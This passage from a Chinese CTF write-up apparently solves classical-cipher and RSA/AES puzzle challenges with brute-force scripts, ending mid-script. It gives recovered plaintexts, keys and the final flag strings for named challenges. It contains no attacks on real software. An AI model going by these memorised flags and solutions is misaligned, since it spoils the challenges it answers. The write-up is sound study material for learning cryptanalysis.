class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(str[j]==<span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">          str[j]=<span class="built_in">char</span>((str[j]<span class="number">-97</span>+<span class="number">1</span>)%<span class="number">26</span>+<span class="number">97</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      cout&lt;&lt;str&lt;&lt;<span class="string">&quot; key=&quot;</span>&lt;&lt;(<span class="number">25</span>-i)&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>python脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="built_in">input</span>()</span><br><span class="line">k=<span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        s1=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">                <span class="keyword">if</span> s[j]==<span class="string">&quot;-&quot;</span> <span class="keyword">or</span> s[j]==<span class="string">&quot; &quot;</span>:</span><br><span class="line">                        s1=s1+s[j]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        s1=s1+<span class="built_in">chr</span>((<span class="built_in">ord</span>(s[j])+i-<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure></div>

<p>得到明文：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dear cathy here is my key caeser is the king of roman empire key=10</span><br></pre></td></tr></table></figure></div>

<p>flag是第三行的内容加下划线分割</p>
<h3 id="来自异乡的演讲稿"><a href="#来自异乡的演讲稿" class="headerlink" title="来自异乡的演讲稿"></a>来自异乡的演讲稿</h3><p>这题目起起伏伏好多遍啊，首先是十九世纪美国的演讲稿，网上找到的可能有两个，一是索琼娜.特鲁斯女士的演讲，一是林肯总统的演讲，根据开头英文单词的数量特点：323721553，可以发现林肯的演讲有一部分是对得上的，将密文与原文对照：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ijv vs gms siugusy ci g umsgo tcqcf vgm, osnociu vrsorsm orgo igocji, jm gix igocji nj </span><br><span class="line">Now we are engaged in a great civil war, testing whether that nation, or any nation so </span><br><span class="line"></span><br><span class="line">tjitscqsygiy nj ysyctgosy, </span><br><span class="line">conceived and so dedicated, </span><br><span class="line"></span><br><span class="line">tgi fjiu siypms. vs gms hso ji g umsgo agoofs-bcsfy jb orgo</span><br><span class="line">can long endure. We are met on a great battle-field of that </span><br><span class="line"></span><br><span class="line">vgm. vs rgqs tjhs oj ysyctgos g kjmocji jb orgo bcsfy, gn g bcigf msnociu kfgts bjm orjns </span><br><span class="line">war. We have come to dedicate a portion of that field, as a final resting place for those </span><br><span class="line"></span><br><span class="line">vrj rsms ugqs orscm fcqsn orgo orgo igocji hcuro fcqs. co cn gfojusorsm bcoociu giy </span><br><span class="line">who here gave their lives that that nation might live. It is altogether fitting and </span><br><span class="line"></span><br><span class="line">kmjksm orgo vs nrjpfy yj orcn.		ors kmjtsnn cn hjms chkjmogio orgi ors msnpfo.</span><br><span class="line">proper that we should do this.		the process is more important than the result</span><br><span class="line"></span><br><span class="line">323721553</span><br></pre></td></tr></table></figure></div>

<p>虽然多了个and，但是无伤大雅，观察会发现密文与明文是一一对应的，所以根据密文对应的明文整理如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a-b b-f c-i d-? e-? f-l g-a h-m i-n j-o k-p l-? m-r n-s o-t p-u q-v r-h s-e t-c u-g v-w w-? x-y y-d z-?</span><br></pre></td></tr></table></figure></div>

<p>会发现其中少了几个字母，以及密文相较于林肯的演讲多了一段，将它翻译出来后仔细品一品，再根据提示：flag是26个英文字母，大概可以猜到flag和加密过程有关，而且大概率是加密的字典。起初我以为是维吉尼亚密码，就整理了一下，但是发现一大串都是’f’，觉得不太对，根据二师傅在群里从出题人口中’撬’出来的提示：英文字母无论如何变幻都只有26个，大概能猜出应该是一份一一对应的字典。但起初我只考虑了密文-明文的字典格式，看着那五个对应不上的问号，查了好多好多资料，但没什么头绪。既然只有五个问号，穷举一下也就120种，平台flag每分钟只能交10次，那我罗列所有可能，花十二分钟不就搞定了？</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> j==i :</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> k==j <span class="keyword">or</span> k==i:</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> l==k <span class="keyword">or</span> l==j <span class="keyword">or</span> l==i:</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                    <span class="keyword">if</span> m==k <span class="keyword">or</span> m==l <span class="keyword">or</span> m==i <span class="keyword">or</span> m==j:</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;r00t&#123;&#123;bfi&#123;&#125;&#123;&#125;lamnop&#123;&#125;rstuvhecgw&#123;&#125;yd&#123;&#125;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(a[i],a[j],a[k],a[l],a[m]))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>使用python3的 <code>.format()</code> 函数时，双写大括号可以转义大括号，例如：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r00t&#123;&#123;&#123;&#125;在哪里?&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"><span class="comment">#输出结果为:r00t&#123;flag在哪里?&#125;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>吐槽一下自己排列组合的程序都有点写不明白了。用该程序跑出的120种flag全都不对。</p>
<p>后来突然想到字典不一定是密文对明文，也可以是明文对密文，恢复的时候前者更便捷，所以让人先入为主的认为字典的模式就是如此，但题目中其实提示要我们找到的是”当时处理文件的方式”，恰巧百度百科中显示替换式密码一般会有一个关键字在前面，例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用混合表系统，关键字为“zebras”：</span><br><span class="line">明文为ABCDEFGHIJKLMNOPQRSTUVWXYZ;密文为ZEBRASCDFGHIJKLMNOPQTUVWXY。</span><br><span class="line">明文为：flee at once. we are discovered；加密结果为：SIAA ZQ LKBA. VA ZOA RFPBLUAOAR。</span><br></pre></td></tr></table></figure></div>

<p>显然密文对明文也有类似情况，但这种顺序出现在了中间一段，那么观察一下明文对密文的字典：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a-g b-a c-t d-y e-s f-b g-u h-r </span><br><span class="line">i-c j-? k-? l-f m-h n-i o-j p-k q-? r-m s-n t-o u-p v-q w-v x-? y-x z-?</span><br></pre></td></tr></table></figure></div>

<p>排除前半段的特殊字母’gatysbur’，后半段恰好是顺序排列的，于是就可以确定关键字是’gatysbur’（虽然它没有什么特殊含义），后面的依次补上不重复的即可，值得一提的是这里明显看出顺序排列的其实是从 <code>l-f</code> 开始的，也就是说有可能前面的jk也是被归在特殊字符里的，但是一般来说题目会给出唯一解，所以直接恢复出如下字典：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a-g b-a c-t d-y e-s f-b g-u h-r </span><br><span class="line">i-c j-d k-e l-f m-h n-i o-j p-k q-l r-m s-n t-o u-p v-q w-v x-w y-x z-z</span><br></pre></td></tr></table></figure></div>

<p>最后整理一下就得到flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r00t&#123;gatysburcdefhijklmnopqvwxz&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://www.sohu.com/a/347222362_120065545" >世界史上最著名的十大演讲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_52620919/article/details/119249518" >CTF-古典密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://baike.baidu.com/item/%E6%9B%BF%E6%8D%A2%E5%BC%8F%E5%AF%86%E7%A0%81" >百度百科-替换式密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/lanluyug/article/details/80245220" >拦路雨g-python3中的format函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="物不知其数"><a href="#物不知其数" class="headerlink" title="物不知其数"></a>物不知其数</h3><p>affine（仿射密码）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">今有物不知其数，三三数之剩二，五五数之剩一，七七数之剩四，问物几何？</span><br><span class="line">a=11</span><br><span class="line">ilwzm reowzter nlekrq wc nle repdeinwkz kp mziecnkrc uwctko</span><br><span class="line"></span><br><span class="line">3x+2=5y+1=7z+4</span><br><span class="line"></span><br><span class="line">e(x)=(11x+b) mod 26</span><br><span class="line">d(x)=19(x-b) mod 26</span><br><span class="line"></span><br><span class="line">11x mod 26=1	a&#x27;=19  	</span><br><span class="line">26 52 78 104 130 156 182 208=11*19-1</span><br><span class="line"></span><br><span class="line">8 11 22 25 12</span><br><span class="line"></span><br><span class="line">china reminder theory is the reflection of ancestors wisdom</span><br></pre></td></tr></table></figure></div>

<p>仿射密码的编码函数 <code>e(x)=(ax+b)mod 26</code> 与解码函数 <code>d(x)=a&#39;(x-b) mod 26</code> 中的a与a’互为关于26的乘法逆元，也就是有 <code>(a*a&#39;) mod 26=1</code> ，仿射密码为了保证映射的一一对应，m（在这里是26）需要与a互质，而从编码公式中不难看出b的范围是 <code>[0,25]</code> 。</p>
<p>根据解码公式写一个脚本爆破b得出明文即可：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> c,d;</span><br><span class="line">  string str;</span><br><span class="line">  <span class="built_in">getline</span>(cin,str);</span><br><span class="line">  <span class="type">int</span> i=<span class="number">26</span>;</span><br><span class="line">  <span class="type">int</span> k=str.<span class="built_in">length</span>();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">    string ss=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(str[j]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">        ss=ss+<span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">int</span> tmp=<span class="number">19</span>*(str[j]<span class="number">-97</span>-i);</span><br><span class="line">      <span class="keyword">while</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        tmp+=<span class="number">26</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ss=ss+<span class="built_in">char</span>((tmp%<span class="number">26</span>)+<span class="number">97</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ss&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>python写的还是没有C++明白…python我不是很清楚字符的编码转换，所以就写了C++。这里值得注意的地方在于减b是不能写成加b来爆破的，直观上关于26取模加减b都是一样轮换的，但实际不是这样，因为前面的系数a’导致加减b的效果并不相同，而很不巧的是C++做不来负数的求余，例如它的 <code>-5 % 26</code> 的结果是-5，所以还需要将中间量转为正数再继续运算。还有个结论：<code>a(x-b) mod 26 = (ax - (ab mod 26)) mod 26</code> 。证明从略。</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_47024013/article/details/118662869" >仿射密码（Affine） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_44033675/article/details/115983293" >1ance.-仿射密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/ISHobbyst/article/details/120094476" >仿射密码原理及例子 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="跨越世纪的密码学"><a href="#跨越世纪的密码学" class="headerlink" title="跨越世纪的密码学"></a>跨越世纪的密码学</h3><p>下载下来一个rsa的python程序，需要简单了解一下rsa加密的实现，然后了解一下python如何实现rsa，安装好相关的包后试着根据程序反向找出flag</p>
<p>首先是从环境中插入了flag_e，然后以它作为明文进行rsa公私钥的生成并加密成密文。已知密文c，公钥e，素数乘积n，n的欧拉函数phi，可以用 <code>ed=1 mod phi</code> 得出私钥d，然后 <code>m=c^d mod n</code> 得到明文m，由于在python中输出明文n显示了乱码的具体值：<code>\xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf</code> ，刚好十二个字节，而密钥少了六个字节的数字字符（这段英文确认了好几遍，是数字的字符），下面的Mode在<a class="link"   href="https://zhuanlan.zhihu.com/p/78913397" >AES <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中有五种，都是三个英文组成的，刚好有六个字节的乱码，我以为这其中有什么转换关系，解码解了两个小时，查了AES无数遍，看了一堆编码，如”unicode”的’utf-8’和’utf-16’与其他编码的关系，python3中bytes类型与str类型的关系与转换，python3默认的编码类型是’UTF-8’，<code>bytes(str,encoding=&#39;utf-8&#39;)</code> 可以转换成字节形式，尝试了将十六进制相互异或得到一字节的数据，python3中只有数字类型可以进行异或运算，字节流也不行，<code>0b1010</code> 表示1010的二进制数字，<code>0xaa</code> 表示aa的十六进制数字，<code>&#39;\xab\xc&#39;</code> 可以便捷的用编码构造字符串，<code>b&#39;xxx&#39;</code> 表示字节类型的字符串数据，<code>f&#39;ab&#123;name&#125;&#39;</code> 快速将name变量的值格式化进字符串中。结果整到最后还是没弄明白有什么联系。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flagenc <span class="keyword">import</span> flag_e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_enc</span>(<span class="params">m</span>):	<span class="comment">#输入明文</span></span><br><span class="line">    p = getPrime(<span class="number">2048</span>)	<span class="comment">#获得2048位的素数</span></span><br><span class="line">    q = getPrime(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">    n = p * q	</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = <span class="number">65535</span>	<span class="comment">#公钥</span></span><br><span class="line">  </span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)	<span class="comment">#c=m^e mod n 加密                                             </span></span><br><span class="line">    <span class="keyword">return</span> c,n,phi</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:	<span class="comment">#作为非脚本运行时</span></span><br><span class="line">    m = bytes_to_long(flag_e.encode())	<span class="comment">#flag编码后转换为长整型</span></span><br><span class="line">    c,n,phi = rsa_enc(m)	<span class="comment">#生成密文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n:&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c:&quot;</span>,c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;phi:&quot;</span>,phi)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#n=867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565332659159017315830404108112573513422514092211961809397683826860955333907492076319697683873070988203533060172226299654640431372636664212890855901106009335408904168663444062395560923280893905574621349215890287022016634315310170201933483641286343232522486854219001353298681437247810130313463294469449829433938014276089581871069130799778570050071269974901888486341414636683400249073904645454444221128885705910670862174811188058907878240460286507231250059471859162034722561368270784238102430157809160745418630702375154475602643880513301644310519285011767707528037046886574977679327586544694372164176809557853155542871095253</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=391697005929552889899624830215124682575267078889079201072133494095145759579046066347252915001923189313973278571826223859645184908706427072190715810096762282243880619637348016497361444041933947882850250418927379704657622278598816689855084883059158337921836786317565166049871100026006393993288893058936739439738022130124099305108140743259731160066564274872151968129045918085079143799107277739464655582585781071099212520363988493913082922866099403377300673366747825256467038243192399767164076685852234653970502846413632195424760038541958148380660429785487390583553120274885240552255285089606977744941886013772747881926208782099692077427795179462019605178557106459296546975237531251622042718424305286207681047331067563366960995950636061474397803323838669834764420996419209392870582956326172388319536169644790216185451519917476555609250782848706670945702170334385909547448130814462907972601574007677975767368742231704088242374802664674914635640557841912213450212858885643646516543254448927591662502002704405591678642934442843031804623559824142416740069180900533516164725769842816713265524045088835470803505780159404892637737146146489585446452325219790835092436936741277597038779688278316092540356696242286837477820043838990654446689758405</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phi=867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565273711064097635722624828303228560977280604283312275720472893738908340485615199442472241554366592725905561371790414263688546266940109530780916523535916653049978164944441237790588358454981712188848464526040048848867904939345772067113042277048544521709018387414016554452106447169079353564720720933763588687864105154485920469108666959519751145013048856811573769466659173292069248737253417982792923468757575784464619482225159866464340115984115915768033859486388780434401618224707697523974328704810085445202274804749169121510267897644783956768255707509767680678009026141447435902688170793766234897120468408039285910787786528</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58</span></span><br><span class="line"><span class="comment">#Encrypt Method: AES</span></span><br><span class="line"><span class="comment">#Key: 1732050807\xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf</span></span><br><span class="line"><span class="comment">#	\x67\x3c\xff\x77  \xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf</span></span><br><span class="line"><span class="comment">#	1732050807 89</span></span><br><span class="line"><span class="comment">#IV: 0000000000000000</span></span><br><span class="line"><span class="comment">#Mode: \xc2\xa5  \xc2\xb6  \xc3\x87</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#CFB</span></span><br><span class="line"><span class="comment">#OFB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Notice: key is 16-digits numeric character.</span></span><br><span class="line"><span class="comment">#key&#x27;s md5: 2116f08e96a6f9090e90c13bd28a3d15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&quot;ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58</span></span><br><span class="line"><span class="comment">#Encrypt Method: AES</span></span><br><span class="line"><span class="comment">#Key: 1732050807ª»ÌÝîÿ</span></span><br><span class="line"><span class="comment">#IV: 0000000000000000</span></span><br><span class="line"><span class="comment">#Mode: ¥¶Ç</span></span><br><span class="line"><span class="comment">#Notice: key is 16-digits numeric character.</span></span><br><span class="line"><span class="comment">#key&#x27;s md5: 2116f08e96a6f9090e90c13bd28a3d15</span></span><br><span class="line"><span class="comment">#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1732050807902831</span></span><br></pre></td></tr></table></figure></div>

<p>下方注释的上半段就是一开始思路的笔记，得不出结果，后来想到乱码可能不是线索，它只是模糊了密钥的后六位，不一定用来解码，且只有在python中我可以看到具体的编码，若是以文本显示我是看不到具体的编码数据的，所以应该是被误导了，就调整了思路，将字符串重新整理了一遍，也就是下半段注释内容，会发现key的md5已经给出，已知前10位的情况下只要爆破后6位并比对md5值即可。</p>
<p>用python的hashlib包来写md5的爆破脚本，这里一开始用的update方法爆破不出结果，后来发现update可能是在末尾衔接新的字符串而不是重置，修改写法后就能跑出对应的密钥了</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ending&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> dic:</span><br><span class="line">                        k=hashlib.md5(<span class="string">f&#x27;1732050807<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;f&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                        <span class="keyword">if</span> k.hexdigest() == <span class="string">&#x27;2116f08e96a6f9090e90c13bd28a3d15&#x27;</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&#x27;1732050807<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;f&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到密钥后解密AES，填充默认即可，偏移为给出的十六个0，由于没给模式需要挨个尝试，注意右下角的编码要选择hex，这个涉及对输入密文的解析，AES算法加密时利用的是位运算，因此最终输入的数据是要经过解析的，这个选项会影响解码的成功与否</p>
<p>解码成功后得到flag（所以跨世纪的密码学到最后也没用上古典密码学）</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95/263310" >百度百科-RSA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/crazylqy/p/10184291.html" >unicode编码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zhaoyanjun6/article/details/120285594" >AES加密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="编码的叠加态"><a href="#编码的叠加态" class="headerlink" title="编码的叠加态"></a>编码的叠加态</h3><p>题目提示了解码顺序是：base32，hex，base64，颜文字，莫斯电码和keyboard</p>
<p>一开始没注意提示，下载文件后看到结尾的&#x3D;&#x3D;就试着用base64解码了一下，结果失败了</p>
<p>颜文字密码是”AAencode”，一个JavaScript的神奇实现，按理来说本地浏览器的控制台应该也能跑，但一直报错，只能靠解码网站：<a class="link"   href="http://www.atoolbox.net/Tool.php?Id=703" >AAEncode加密&#x2F;解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>然后是莫斯电码，先删除末尾的封号，最初版本的文件是有点问题的，LIP的I那里出错了。莫斯电码解码出来得到的密文要用”keyboard”解码，一开始以为是对照键盘位置做字母代换：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">letters=[<span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">letter=[<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;t&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">k=<span class="built_in">len</span>(s)</span><br><span class="line">s2=s.lower()</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a2q</span>(<span class="params">s2</span>):</span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span 